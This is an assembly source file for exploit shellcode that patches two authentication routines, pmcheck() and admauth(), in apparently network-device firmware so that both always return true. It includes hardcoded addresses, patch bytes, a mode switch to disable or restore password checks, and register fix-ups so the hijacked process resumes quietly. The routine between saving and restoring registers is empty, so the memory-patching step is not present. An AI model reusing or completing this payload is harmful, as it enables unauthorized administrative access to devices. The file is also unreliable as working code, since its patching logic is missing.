BITS 32

; comment this out to generate the pass-enable shellcode
%define MODE_PASS_DISABLE

SAFERET_OFFSET  equ     0x11111111       ; where to continue execution
PMCHECK_BOUNDS  equ     0x9b78000       ; mprotect for pmcheck()
PMCHECK_OFFSET  equ     0x9b78010       ; location of pmcheck()
ADMAUTH_BOUNDS  equ     0x8085000       ; page align for admauth()
ADMAUTH_OFFSET  equ     0x8085a40       ; location of admauth()

; we must patch pmcheck() and admauth() to always return true
; xor eax, eax  = 31 c0
; inc eax       = 40
; ret           = c3

PATCHED_CODE      equ     0xc340c031    ; gotta love endianess
PMCHECK_CODE      equ     0x89c03155    ; the original bytes at pmcheck()
ADMAUTH_CODE      equ     0x57e58955    ; the original bytes at admauth()

%ifdef MODE_PASS_DISABLE
%define PMCHECK_BYTES PATCHED_CODE
%define ADMAUTH_BYTES PATCHED_CODE
%else
%define PMCHECK_BYTES PMCHECK_CODE
%define ADMAUTH_BYTES ADMAUTH_CODE
%endif

; we need to fix the function frame to continue normal operation
; eax = 0x0
; esi = 0x0
; edi = 0x0b
; ebx = 0x10
; ebp = [esp - 0x4 (ret)] + 0x??
FIX_EBP         equ     0x48            ; this is 0x58 in versions before 8.4(1)
FIX_EDI         equ     0x0f0f0f0b      ; seems static?
FIX_EBX         equ     0x10            ; seems static?

_start:

    ; these are registers we have to clean up, so we can null them before save
    xor ebx, ebx
    xor esi, esi
    xor ecx, ecx                        ; ecx is volatile register
    xor eax, eax

    pusha                               ; save all registers



_clean:
    popa                                ; restore all registers

    push SAFERET_OFFSET                 ; push the safe return address

    ; these registers are pre-xored
    add bl, FIX_EBX
    mov edi, FIX_EDI

    mov ebp, esp
    add ebp, FIX_EBP

    ret                                 ; return to safe address
